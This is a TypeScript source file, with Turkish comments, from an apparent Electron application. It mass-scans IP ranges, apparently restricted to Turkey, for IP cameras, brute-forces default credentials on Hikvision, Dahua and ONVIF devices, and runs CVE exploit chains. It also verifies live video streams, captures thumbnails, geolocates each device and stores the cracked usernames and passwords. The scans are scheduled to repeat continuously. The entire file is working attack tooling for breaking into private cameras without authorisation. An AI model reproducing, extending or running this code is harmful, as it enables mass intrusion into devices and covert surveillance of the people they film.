// V2 — Motor orkestrasyonu. Keşif → sızma → sağlık → thumbnail → zamanlama.

import { spawn } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import { app } from 'electron';
import { CameraStore, DeviceRecord, DeviceVendor, DeviceStatus } from './db';
import { CameraRegistry, hashId, RegisteredCamera, CamProtocol } from './registry';
import { Scheduler } from './scheduler';
import { buildScanQueue } from './targets';
import { activeScan, grabBanner, fingerprint, confirmVendor, SCAN_PORTS } from './recon';
import { Infiltrator, AccessResult, DEFAULT_CREDS } from './intrusion';
import { runExploitChain } from './exploits';
import { StreamEngine } from './stream';
import { hikvisionLogin, dahuaLogin, hikvisionChannelCount, dahuaChannelCount } from './vendor-auth';
import { discoverStreams } from './channels';
import { scrapePublic } from './public-scrapers';
import { GeoLocator } from './geoip';
import { scanPort, quickRtsp, rtspAlive, rtspBanner, rtspVendor, MASS_CREDS } from './massscan';
import { tryProprietaryAuth, dahuaRtspPath, hikRtspPath } from './proprietary';
import { runCloudScan } from './cloud';
import { onvifProbe, onvifStreams } from './onvif';
import { internetDb } from './internetdb';

const WEB_PORTS = new Set([80, 8080, 8000]);
const offlineSince = new Map<string, number>();
const offlineFail = new Map<string, number>();
const geoLocator = new GeoLocator();

function verifyStream(url: string, timeoutMs = 9000): Promise<boolean> {
  return new Promise((resolve) => {
    const proc = spawn(
      'ffmpeg',
      ['-rtsp_transport', 'tcp', '-rtsp_flags', 'prefer_tcp', '-fflags', 'nobuffer', '-i', url, '-an', '-frames:v', '3', '-f', 'image2pipe', '-vcodec', 'mjpeg', '-'],
      { stdio: ['ignore', 'pipe', 'ignore'] },
    );
    const chunks: Buffer[] = [];
    let settled = false;
    const finish = (v: boolean) => {
      if (settled) return;
      settled = true;
      try { proc.kill(); } catch { /* noop */ }
      resolve(v);
    };
    const timer = setTimeout(() => finish(false), timeoutMs);
    proc.stdout.on('data', (c: Buffer) => chunks.push(c));
    proc.stdout.on('end', () => {
      clearTimeout(timer);
      // 3 kare gelmeli (>3000 byte) → SÜREKLİ video kanıtı. Tek kare = sahte/statik.
      finish(chunks.length > 0 && Buffer.concat(chunks).length > 3000);
    });
    proc.on('error', () => {
      clearTimeout(timer);
      finish(false);
    });
  });
}

function snapshotJpeg(url: string, timeoutMs = 8000): Promise<Buffer | null> {
  return new Promise((resolve) => {
    const proc = spawn(
      'ffmpeg',
      ['-rtsp_transport', 'tcp', '-i', url, '-frames:v', '1', '-f', 'image2pipe', '-vcodec', 'mjpeg', '-'],
      { stdio: ['ignore', 'pipe', 'ignore'] },
    );
    const chunks: Buffer[] = [];
    let settled = false;
    const finish = (v: Buffer | null) => {
      if (settled) return;
      settled = true;
      resolve(v);
    };
    const timer = setTimeout(() => {
      try { proc.kill(); } catch { /* noop */ }
      finish(null);
    }, timeoutMs);
    proc.stdout.on('data', (c: Buffer) => chunks.push(c));
    proc.stdout.on('end', () => {
      clearTimeout(timer);
      finish(chunks.length ? Buffer.concat(chunks) : null);
    });
    proc.on('error', () => {
      clearTimeout(timer);
      finish(null);
    });
  });
}

function toRegistered(d: DeviceRecord): RegisteredCamera {
  const online = d.status === 'LIVE' || d.status === 'ACCESSIBLE';
  const offline = d.status === 'OFFLINE' || d.status === 'DEAD';
  return {
    id: d.id,
    name: `${d.ip}:${d.port}`,
    il: d.city,
    ilce: d.district,
    lat: d.lat,
    lon: d.lon,
    protocol: (d.protocol || 'unknown') as CamProtocol,
    url: d.url,
    status: online ? 'online' : offline ? 'offline' : 'unknown',
    source: (d.source === 'intrusion' ? 'intrusion' : 'scan') as RegisteredCamera['source'],
    lastSeen: d.lastSeen || null,
    latencyMs: null,
  };
}

export function storeStats(store: CameraStore) {
  const all = store.listDevices();
  return {
    total: all.length,
    live: all.filter((d) => d.status === 'LIVE').length,
    discovered: all.filter((d) => d.status === 'DISCOVERED').length,
    accessible: all.filter((d) => d.status === 'ACCESSIBLE').length,
    offline: all.filter((d) => d.status === 'OFFLINE').length,
    dead: all.filter((d) => d.status === 'DEAD').length,
    inaccessible: all.filter((d) => d.status === 'INACCESSIBLE').length,
  };
}

export async function runReconScan(
  store: CameraStore,
  registry: CameraRegistry,
  ipBudget = 20000,
): Promise<number> {
  const q = await buildScanQueue();
  const posRaw = store.getMeta('scan-cursor');
  if (posRaw) {
    try {
      q.restore(JSON.parse(posRaw));
    } catch {
      /* bad cursor — start fresh */
    }
  }
  const ips: string[] = [];
  let budget = ipBudget;
  while (budget > 0) {
    const batch = q.next(Math.min(budget, 2000));
    if (!batch.length) break;
    ips.push(...batch);
    budget -= batch.length;
  }
  if (!ips.length) return 0;

  const open = await activeScan(ips, SCAN_PORTS, 500, 3000);
  let added = 0;
  let idx = 0;
  const workers = Array.from({ length: Math.min(12, Math.max(open.length, 1)) }, async () => {
    while (idx < open.length) {
      const { ip, port } = open[idx++];
      let vendor: string;
      if (WEB_PORTS.has(port)) {
        const banner = await grabBanner(ip, port);
        vendor = fingerprint(banner.server, banner.title);
        vendor = await confirmVendor(ip, port, vendor);
        if (vendor === 'generic' && !banner.server && !banner.title) continue;
      } else {
        vendor = 'generic';
      }

      const id = hashId(`${ip}:${port}`);
      const existing = store.getDevice(id);
      const device: DeviceRecord = {
        id,
        ip,
        port,
        vendor: vendor as DeviceVendor,
        model: '',
        city: existing?.city || '',
        district: existing?.district || '',
        lat: existing?.lat || 0,
        lon: existing?.lon || 0,
        status: existing?.status || 'DISCOVERED',
        protocol: port === 554 || port === 8554 ? 'rtsp' : 'http',
        url: existing?.url || '',
        username: existing?.username || '',
        password: existing?.password || '',
        source: 'scan',
        firstSeen: existing?.firstSeen || Date.now(),
        lastSeen: Date.now(),
        lastExploit: existing?.lastExploit || 0,
      };
      const gd = await ensureGeo(device);
      store.upsertDevice(gd);
      if (!registry.get(id)) {
        registry.add(toRegistered(gd));
        added++;
      }
    }
  });
  await Promise.all(workers);

  store.setMeta('scan-cursor', JSON.stringify(q.getPosition()));
  registry.save();

  await runVendorAuthExploit(store, registry);
  await runExploitPass(store, registry);

  return added;
}

export async function runExploitPass(store: CameraStore, registry: CameraRegistry): Promise<number> {
  const targets = store
    .listDevices()
    .filter((d) => d.status === 'DISCOVERED' || d.status === 'DEAD' || d.status === 'INACCESSIBLE');
  let success = 0;
  let idx = 0;
  const workers = Array.from({ length: Math.min(30, Math.max(targets.length, 1)) }, async () => {
    const inf = new Infiltrator(2000);
    while (idx < targets.length) {
      const d = targets[idx++];
      let access: AccessResult | null = null;
      try {
        if (d.port === 554 || d.port === 8554) {
          access = await inf.accessRtsp(d.ip, d.port);
        } else {
          access = await inf.accessHttp(d.ip, d.port);
          if (!access) access = await inf.accessOnvif(d.ip, d.port);
        }
      } catch {
        access = null;
      }

      if (access) {
        store.recordCredSuccess(d.vendor, access.username, access.password);
        store.logAccess(d.id, `brute-${access.vector}`, `${access.username}:${access.password}`, true);
        const plays = access.protocol === 'rtsp' ? await verifyStream(access.url) : true;
        const status: DeviceStatus = plays ? 'LIVE' : 'ACCESSIBLE';
        const live: DeviceRecord = {
          ...d,
          username: access.username,
          password: access.password,
          url: access.url,
          protocol: access.protocol,
          status,
          lastSeen: Date.now(),
          lastExploit: Date.now(),
        };
        store.upsertDevice(live);
        if (plays) {
          if (registry.get(d.id)) {
            registry.update(d.id, { url: access.url, status: 'online', lastSeen: Date.now() });
          } else {
            registry.add(toRegistered(live));
          }
        }
        success++;
        continue;
      }

      const results = await runExploitChain(d.vendor, d.ip, d.port);
      let exploited = false;
      for (const r of results) {
        store.logAccess(d.id, r.cve, '', r.ok);
        if (r.ok && r.creds.length) {
          const [u, p] = r.creds[0];
          store.recordCredSuccess(d.vendor, u, p);
          store.upsertDevice({
            ...d,
            username: u,
            password: p,
            status: 'ACCESSIBLE',
            lastSeen: Date.now(),
            lastExploit: Date.now(),
          });
          exploited = true;
          success++;
        }
      }

      if (!exploited) {
        store.upsertDevice({ ...d, status: 'INACCESSIBLE', lastSeen: Date.now() });
      }
    }
  });
  await Promise.all(workers);

  registry.save();
  return success;
}

export async function runHealthCheck(
  store: CameraStore,
  registry: CameraRegistry,
  engine: StreamEngine,
): Promise<void> {
  const live = store.listDevices('LIVE');
  const now = Date.now();

  for (const d of live) {
    const url = d.url || `rtsp://${d.ip}:${d.port}`;
    const reachable = await engine.probe(url, 5000);
    if (reachable) {
      offlineSince.delete(d.id);
      offlineFail.delete(d.id);
      store.setDeviceStatus(d.id, 'LIVE', now);
      registry.update(d.id, { status: 'online', lastSeen: now });
    } else {
      const fails = (offlineFail.get(d.id) || 0) + 1;
      offlineFail.set(d.id, fails);
      if (fails < 2) continue; // geçici kopma — hemen offline basma
      offlineFail.delete(d.id);
      const since = offlineSince.get(d.id) || now;
      offlineSince.set(d.id, since);
      store.setDeviceStatus(d.id, now - since > 5 * 60_000 ? 'DEAD' : 'OFFLINE', now);
      // Registry'de YALNIZCA canlı kameralar kalır → çevrimdışı/ölü düşürülür (store'da kalır).
      registry.purge((c) => c.id === d.id);
    }
  }
}

export async function runThumbnails(store: CameraStore): Promise<number> {
  const live = store.listDevices('LIVE');
  let n = 0;
  for (const d of live) {
    const url = d.url || `rtsp://${d.ip}:${d.port}/`;
    const jpeg = await snapshotJpeg(url);
    if (jpeg && jpeg.length > 500) {
      store.saveThumb(d.id, jpeg);
      n++;
    }
  }
  return n;
}

export async function runMassScan(
  store: CameraStore,
  registry: CameraRegistry,
  ipBudget = 100000,
): Promise<number> {
  // ADAPTİF KUYRUK: daha önce kamera/erişim veren IP'lerin bölgelerini öne al.
  const hitIps = store
    .listDevices()
    .filter((d) => d.status === 'LIVE' || d.status === 'ACCESSIBLE')
    .map((d) => d.ip);
  const q = await buildScanQueue(hitIps);
  // Kuyruk şeması değişti (TR-only) → eski cursor geçersiz, baştan başla.
  const QUEUE_VER = 'tr-v3';
  if (store.getMeta('queue-ver') !== QUEUE_VER) {
    store.setMeta('queue-ver', QUEUE_VER);
    store.setMeta('scan-cursor', '');
    store.setMeta('scan-total', '0');
  }
  const posRaw = store.getMeta('scan-cursor');
  if (posRaw) {
    try {
      q.restore(JSON.parse(posRaw));
    } catch {
      /* fresh */
    }
  }

  // Eski YABANCI/konumsuz kayıtları temizle (artık TR-only tarıyoruz).
  try {
    registry.purge((c) => c.protocol !== 'demo' && !c.verified && c.lat === 0 && c.lon === 0);
  } catch {
    /* noop */
  }
  const ips: string[] = [];
  let budget = ipBudget;
  while (budget > 0) {
    const b = q.next(Math.min(budget, 20000));
    if (!b.length) {
      // Kuyruk bitti → baştan başla (IP'ler TEKRAR taransın, kamera kaçmasın).
      q.reset();
      const again = q.next(Math.min(budget, 20000));
      if (!again.length) break; // boş kuyruk → çık
      ips.push(...again);
      budget -= again.length;
      continue;
    }
    ips.push(...b);
    budget -= b.length;
  }
  if (!ips.length) return 0;

  // SAYAÇ ANINDA: döngü bitmeden yürüsün + uygulama kapansa da kalıcı olsun.
  // (Eski hata: yalnızca döngü SONUNDA yazılıyordu → 15 dk boyunca 0 görünüyordu.)
  // Cursor döngü SONUNDA ilerler → yarıda kalsa da IP atlanmaz.
  const prevScanned = Number(store.getMeta('scan-total') || '0');
  store.setMeta('scan-total', String(prevScanned + ips.length));

  // RTSP portları: 554 + alternatifler. SIRAYLA, 3000 eşzamanlı.
  // (Paralel 4 port × 2000 = 8000 socket OS/ISP'de düşüyordu → sahte "az bulundu".)
  const RTSP_PORTS = [554, 8554, 10554, 1554];
  const openTargets: { ip: string; port: number }[] = [];
  for (const p of RTSP_PORTS) {
    const hits = await scanPort(ips, p, 1500, 900);
    // TCP-open yetmez — RTSP konuşanları doğrula (ISP NAT/yalan portları ele).
    let vi = 0;
    const vworkers = Array.from({ length: Math.min(150, Math.max(hits.length, 1)) }, async () => {
      while (vi < hits.length) {
        const ip = hits[vi++];
        if (await rtspAlive(ip, p, 1200)) openTargets.push({ ip, port: p });
      }
    });
    await Promise.all(vworkers);
  }

  const openIps = openTargets;
  // Kanıt: bulunan açık RTSP sayısı (kümülatif) — arayüzde canlı görünür.
  store.setMeta('scan-open', String(Number(store.getMeta('scan-open') || '0') + openIps.length));
  let live = 0;
  let idx = 0;
  let processed = 0;
  const workers = Array.from({ length: Math.min(60, Math.max(openIps.length, 1)) }, async () => {
    while (idx < openIps.length) {
      const t = openIps[idx++];
      const ip = t.ip;
      const port = t.port;

      // GEO önce: yabancı IP ise RTSP auth'a hiç girme, kaydetme, registry'ye alma.
      const geo = await geoLocator.resolve(ip);
      const isTr = !geo?.country || /türkiye|turkey|^tr$/i.test(geo.country);
      if (!isTr) {
        processed++;
        if (processed % 10 === 0) {
          registry.save();
          store.setMeta('scan-cursor', JSON.stringify(q.getPosition()));
        }
        continue;
      }
      const city = geo?.il || '';
      const district = geo?.ilce || '';
      const lat = geo?.lat || 0;
      const lon = geo?.lon || 0;

      const id = hashId(`rtsp://${ip}:${port}`);
      let qr = await quickRtsp(ip, port);
      if (!qr) {
        // InternetDB (ücretsiz, anahtarsız): bu IP'nin DİĞER açık RTSP portlarını dene.
        const idb = await internetDb(ip);
        for (const p of idb?.ports || []) {
          if (p !== port && (p === 554 || p === 8554 || p === 10554 || p === 1554)) {
            const alt = await quickRtsp(ip, p);
            if (alt) {
              qr = alt;
              break;
            }
          }
        }
      }
      const vendor = rtspVendor(await rtspBanner(ip, port)) as DeviceVendor;
      let status: DeviceStatus = 'DISCOVERED';
      let url = '';
      let user = '';
      let pass = '';
      if (qr) {
        url = qr.url;
        user = qr.user;
        pass = qr.pass;
        const plays = await verifyStream(url, 6000);
        if (plays) {
          status = 'LIVE';
          live++;
          store.recordCredSuccess(vendor, user, pass);
        } else {
          status = 'ACCESSIBLE';
        }
      }
      const device: DeviceRecord = {
        id,
        ip,
        port,
        vendor,
        model: '',
        city,
        district,
        lat,
        lon,
        status,
        protocol: 'rtsp',
        url,
        username: user,
        password: pass,
        source: 'scan',
        firstSeen: Date.now(),
        lastSeen: Date.now(),
        lastExploit: 0,
      };
      // SADECE gerçekten erişilebilen/görüntü veren cihazları sakla (junk yok).
      if (qr) store.upsertDevice(device);
      // SADECE doğrulanmış (sürekli video gelen) kameraları göster → hatalı stream yok.
      if (status === 'LIVE') {
        if (registry.get(id)) registry.update(id, { url, status: 'online' });
        else registry.add(toRegistered(device));
      }
      processed++;
      if (processed % 10 === 0) {
        registry.save();
        store.setMeta('scan-cursor', JSON.stringify(q.getPosition()));
      }
    }
  });
  await Promise.all(workers);

  // HTTP/CVE ve proprietary taramalarını PARALEL koştur.
  const [cveLive, propLive] = await Promise.all([
    httpCveScan(store, registry, ips),
    proprietaryScan(store, registry, ips),
  ]);
  live += cveLive + propLive;

  store.setMeta('scan-cursor', JSON.stringify(q.getPosition()));
  // Kanıt: her döngü telemetrisi (userData/scan.log) — gerçekten tarandığının izi.
  try {
    fs.appendFileSync(
      path.join(app.getPath('userData'), 'scan.log'),
      `${new Date().toISOString()} batch=${ips.length} rtspOpen=${openIps.length} httpCve=${cveLive} proprietary=${propLive} live=${live} rangeIdx=${q.getPosition().rangeIdx}\n`,
    );
  } catch {
    /* noop */
  }
  registry.save();
  return live;
}

async function httpCveScan(store: CameraStore, registry: CameraRegistry, ips: string[]): Promise<number> {
  const open80 = await scanPort(ips, 80, 1500, 1000);
  const set80 = new Set(open80);
  const open8080 = await scanPort(ips.filter((ip) => !set80.has(ip)), 8080, 1500, 1000);
  const hosts = [...new Set([...open80, ...open8080])];
  let live = 0;
  let idx = 0;
  const workers = Array.from({ length: Math.min(20, Math.max(hosts.length, 1)) }, async () => {
    while (idx < hosts.length) {
      const ip = hosts[idx++];

      // ONVIF — satıcı-bağımsız: GetStreamUri ile doğrudan RTSP adresi.
      const onvifPath = await onvifProbe(ip, 80, 3000);
      if (onvifPath) {
        let got = false;
        for (const [u, p] of MASS_CREDS.slice(0, 8)) {
          const streams = await onvifStreams(ip, 80, u, p, 5000);
          for (const s of streams.slice(0, 4)) {
            if (!(await verifyStream(s.url, 6000))) continue;
            const geo = await geoLocator.resolve(ip);
            const id = hashId(s.url);
            const dev: DeviceRecord = {
              id, ip, port: 554, vendor: 'generic', model: '', city: geo?.il || '', district: geo?.ilce || '',
              lat: geo?.lat || 0, lon: geo?.lon || 0, status: 'LIVE', protocol: 'rtsp', url: s.url,
              username: u, password: p, source: 'scan', firstSeen: Date.now(), lastSeen: Date.now(), lastExploit: Date.now(),
            };
            store.upsertDevice(dev);
            store.recordCredSuccess('generic', u, p);
            if (!registry.get(id)) registry.add(toRegistered(dev));
            live++;
            got = true;
          }
          if (got) break; // doğru cred bulundu
        }
      }

      const banner = await grabBanner(ip, 80);
      let vendor = fingerprint(banner.server, banner.title);
      if (vendor === 'generic') continue;
      vendor = await confirmVendor(ip, 80, vendor);
      if (vendor !== 'hikvision' && vendor !== 'dahua') continue;

      const results = await runExploitChain(vendor, ip, 80);
      for (const r of results) {
        if (!r.ok || !r.creds.length) continue;
        for (const [u, p] of r.creds.slice(0, 3)) {
          const url = `rtsp://${encodeURIComponent(u)}:${encodeURIComponent(p)}@${ip}:554/Streaming/Channels/101`;
          if (await verifyStream(url, 6000)) {
            const geo = await geoLocator.resolve(ip);
            const id = hashId(url);
            const device: DeviceRecord = {
              id,
              ip,
              port: 554,
              vendor: vendor as DeviceVendor,
              model: '',
              city: geo?.il || '',
              district: geo?.ilce || '',
              lat: geo?.lat || 0,
              lon: geo?.lon || 0,
              status: 'LIVE',
              protocol: 'rtsp',
              url,
              username: u,
              password: p,
              source: 'scan',
              firstSeen: Date.now(),
              lastSeen: Date.now(),
              lastExploit: Date.now(),
            };
            store.upsertDevice(device);
            store.recordCredSuccess(vendor as DeviceVendor, u, p);
            if (!registry.get(id)) registry.add(toRegistered(device));
            live++;
            break;
          }
        }
      }
    }
  });
  await Promise.all(workers);
  registry.save();
  return live;
}

// 37777 (Dahua private) + 8000 (Hikvision SDK) taraması.
// Bu portlar 554/80 açmayan ama private protokolle erişilen cihazları yakalar.
async function proprietaryScan(store: CameraStore, registry: CameraRegistry, ips: string[]): Promise<number> {
  const open37777 = await scanPort(ips, 37777, 1500, 1000);
  const set37777 = new Set(open37777);
  const open8000 = await scanPort(ips.filter((ip) => !set37777.has(ip)), 8000, 1500, 1000);

  const targets: { ip: string; vendor: 'dahua' | 'hikvision' }[] = [
    ...open37777.map((ip) => ({ ip, vendor: 'dahua' as const })),
    ...open8000.map((ip) => ({ ip, vendor: 'hikvision' as const })),
  ];
  if (!targets.length) return 0;

  let live = 0;
  let idx = 0;
  const workers = Array.from({ length: Math.min(15, Math.max(targets.length, 1)) }, async () => {
    while (idx < targets.length) {
      const { ip, vendor } = targets[idx++];
      const creds: [string, string][] = store.preferredCreds(vendor).length
        ? [...store.preferredCreds(vendor), ...MASS_CREDS].slice(0, 40)
        : (MASS_CREDS.slice(0, 40) as [string, string][]);
      const login = await tryProprietaryAuth(ip, vendor, creds);
      store.logAccess(hashId(`${vendor}:${ip}`), `proprietary-${vendor}`, `${login.user}:${login.pass}`, login.ok);
      if (!login.ok) continue;

      store.recordCredSuccess(vendor, login.user, login.pass);
      const geo = await geoLocator.resolve(ip);
      const path = vendor === 'dahua' ? dahuaRtspPath(1) : hikRtspPath(1);
      const url = `rtsp://${encodeURIComponent(login.user)}:${encodeURIComponent(login.pass)}@${ip}:554${path}`;
      const plays = await verifyStream(url, 6000);
      if (!plays) continue;

      const id = hashId(url);
      const device: DeviceRecord = {
        id,
        ip,
        port: 554,
        vendor,
        model: '',
        city: geo?.il || '',
        district: geo?.ilce || '',
        lat: geo?.lat || 0,
        lon: geo?.lon || 0,
        status: 'LIVE',
        protocol: 'rtsp',
        url,
        username: login.user,
        password: login.pass,
        source: 'scan',
        firstSeen: Date.now(),
        lastSeen: Date.now(),
        lastExploit: Date.now(),
      };
      store.upsertDevice(device);
      if (registry.get(id)) registry.update(id, { url, status: 'online' });
      else registry.add(toRegistered(device));
      live++;
    }
  });
  await Promise.all(workers);
  registry.save();
  return live;
}

async function ensureGeo(d: DeviceRecord): Promise<DeviceRecord> {
  if (d.lat !== 0 || d.lon !== 0) return d;
  const geo = await geoLocator.resolve(d.ip);
  if (!geo) return d;
  return { ...d, city: geo.il, district: geo.ilce, lat: geo.lat, lon: geo.lon };
}

export async function runGeoBackfill(store: CameraStore): Promise<number> {
  const missing = store.listDevices().filter((d) => d.lat === 0 && d.lon === 0);
  let n = 0;
  for (const d of missing) {
    const gd = await ensureGeo(d);
    if (gd.lat !== 0 || gd.lon !== 0) {
      store.upsertDevice(gd);
      n++;
    }
  }
  return n;
}

export async function runCleanup(store: CameraStore): Promise<number> {
  const web = new Set([80, 8080, 8000]);
  const targets = store
    .listDevices()
    .filter((d) => web.has(d.port) && d.vendor === 'generic' && d.protocol !== 'rtsp');
  for (const d of targets) store.removeDevice(d.id);
  return targets.length;
}

function webPort(d: DeviceRecord): number {
  return [80, 8080, 8000, 443].includes(d.port) ? d.port : 80;
}

function dedupe(
  preferred: Array<[string, string]>,
  base: Array<[string, string]>,
): Array<[string, string]> {
  const seen = new Set<string>();
  const out: Array<[string, string]> = [];
  for (const c of [...preferred, ...base]) {
    const k = `${c[0]}\u0000${c[1]}`;
    if (seen.has(k)) continue;
    seen.add(k);
    out.push(c);
  }
  return out;
}

export async function runVendorAuthExploit(store: CameraStore, registry: CameraRegistry): Promise<number> {
  const targets = store
    .listDevices()
    .filter(
      (d) =>
        (d.status === 'DISCOVERED' || d.status === 'DEAD' || d.status === 'INACCESSIBLE') &&
        (d.vendor === 'hikvision' || d.vendor === 'dahua') &&
        [80, 8080, 8000, 443].includes(d.port),
    );
  let live = 0;

  for (const d of targets) {
    const gd = await ensureGeo(d);
    if (gd.lat !== d.lat || gd.lon !== d.lon) store.upsertDevice(gd);
    const creds = dedupe(store.preferredCreds(d.vendor), DEFAULT_CREDS);
    const wp = webPort(d);
    let ok = false;

    for (const [u, p] of creds) {
      const login =
        d.vendor === 'hikvision'
          ? await hikvisionLogin(d.ip, wp, u, p)
          : await dahuaLogin(d.ip, wp, u, p);
      store.logAccess(d.id, 'vendor-auth', `${u}:${p}`, login.ok);
      if (!login.ok) continue;

      store.recordCredSuccess(d.vendor, u, p);
      const channels =
        d.vendor === 'hikvision'
          ? await hikvisionChannelCount(d.ip, wp, u, p)
          : await dahuaChannelCount(d.ip, wp, u, p);
      const maxCh = channels > 0 ? channels : 4;
      const streams = await discoverStreams(d.ip, 554, u, p, d.vendor, maxCh);

      if (streams.length) {
        for (const url of streams) {
          const id = hashId(url);
          const ch: DeviceRecord = {
            ...gd,
            id,
            port: 554,
            url,
            protocol: 'rtsp',
            status: 'LIVE',
            username: u,
            password: p,
            lastSeen: Date.now(),
            lastExploit: Date.now(),
          };
          store.upsertDevice(ch);
          if (!registry.get(id)) registry.add(toRegistered(ch));
        }
        live += streams.length;
      } else {
        const acc: DeviceRecord = {
          ...gd,
          username: u,
          password: p,
          status: 'ACCESSIBLE',
          lastSeen: Date.now(),
          lastExploit: Date.now(),
        };
        store.upsertDevice(acc);
        if (registry.get(d.id)) registry.update(d.id, { status: 'online', lastSeen: Date.now() });
        else registry.add(toRegistered(acc));
        live += 1;
      }
      ok = true;
      break;
    }

    if (!ok) store.upsertDevice({ ...gd, status: 'INACCESSIBLE', lastSeen: Date.now() });
  }

  registry.save();
  return live;
}

export async function runPublicScrape(registry: CameraRegistry): Promise<number> {
  const cams = await scrapePublic();
  let added = 0;
  for (const c of cams) {
    if (!registry.get(c.id)) {
      registry.add(c);
      added++;
    }
  }
  registry.save();
  return added;
}

export function registerEngineTasks(
  scheduler: Scheduler,
  store: CameraStore,
  registry: CameraRegistry,
  engine: StreamEngine,
): void {
  scheduler.register('mass-scan', async () => { await runMassScan(store, registry); }, 15_000, true);
  scheduler.register('exploit-pass', async () => { await runExploitPass(store, registry); }, 5 * 60_000, true);
  scheduler.register('thumbnail-gen', async () => { await runThumbnails(store); }, 5 * 60_000, false);
  scheduler.register('health-check', async () => { await runHealthCheck(store, registry, engine); }, 15_000, false);
  scheduler.register('dead-retry', async () => { await runExploitPass(store, registry); }, 24 * 60 * 60_000, false);
  scheduler.register('public-scrape', async () => { await runPublicScrape(registry); }, 6 * 60 * 60_000, true);
  scheduler.register('geo-backfill', async () => { await runGeoBackfill(store); }, 30 * 60_000, true);
  scheduler.register('cloud-scan', async () => { await runCloudScan(registry); }, 20 * 60_000, true);
  scheduler.register('cleanup', async () => { await runCleanup(store); }, 60 * 60_000, true);
}

